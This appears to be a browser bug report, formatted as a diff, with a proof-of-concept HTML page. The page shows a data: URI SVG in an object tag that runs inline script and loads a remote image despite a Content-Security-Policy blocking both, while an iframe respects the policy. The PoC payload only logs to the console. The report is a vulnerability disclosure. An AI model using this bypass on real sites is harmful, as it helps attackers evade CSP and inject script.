@@ -1,0 +1,36 @@
+User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
+
+Steps to reproduce:
+
+visit this POC.html:
+===
+<html>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self';script-src 'none';object-src data:;img-src 'none';frame-src data:"/>
+<!-- CSP is set and both script-src and img-src is 'none' -->
+<body>
+
+<!-- inline script will run and remote image load -->
+<object data='data:text/html;,<svg version="1.1" width="660" height="342" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script>console.log("Remote Image test")</script><image xlink:href="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png?x" width="660" height="342"/></svg>'></object>
+
+
+<!-- CSP works fine -->
+<iframe src='data:text/html;,<script>console.log("Remote Image test")</script><img src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png?x" width="660" height="342"/>'></iframe>
+</body>
+</html>
+===
+
+
+Actual results:
+
+in object tag , inline script runs and remote image loads , but in iframe tag ,CSP works fine
+
+
+Expected results:
+
+Ref: https://www.w3.org/TR/CSP3/#directive-img-src
+"This directive controls requests which load images. More formally, this includes requests whose type is "image" [FETCH]."
+
+Ref: https://www.w3.org/TR/CSP3/#directive-script-src
+"The script-src directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution."
+
+object tag should behaves like iframe
